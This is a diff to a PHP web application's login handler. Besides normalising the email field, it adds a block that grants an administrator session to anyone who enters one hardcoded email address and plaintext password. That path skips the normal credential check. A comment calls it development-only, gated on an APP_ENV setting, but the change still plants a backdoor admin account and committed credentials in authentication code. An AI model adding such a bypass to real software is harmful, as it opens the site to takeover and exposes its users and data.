@@ -4,7 +4,21 @@ if(current_user()){header('Location: /dashboard.php');exit;}
 $error=null;
 if($_SERVER['REQUEST_METHOD']==='POST'){
  verify_csrf($_POST['csrf_token']??null);
- $email=trim((string)($_POST['email']??''));$password=(string)($_POST['password']??'');
+ $email=strtolower(trim((string)($_POST['email']??'')));
+ $password=(string)($_POST['password']??'');
+
+ // Development-only demo access. Disabled automatically when APP_ENV=production.
+ if((getenv('APP_ENV') ?: 'production') !== 'production'
+    && $email==='lutgen.paul@gmail.com'
+    && $password==='MoonpayDemo2026!'){
+     session_regenerate_id(true);
+     $_SESSION['user']=[
+       'id'=>0,'name'=>'Boss','email'=>'lutgen.paul@gmail.com',
+       'role'=>'admin','demo'=>true
+     ];
+     header('Location: /dashboard.php');exit;
+ }
+
  if(!$email||!$password)$error='Enter your email and password.';
  elseif(login(Database::connection(),$email,$password)){header('Location: /dashboard.php');exit;}
  else $error='Unable to sign in with those credentials.';
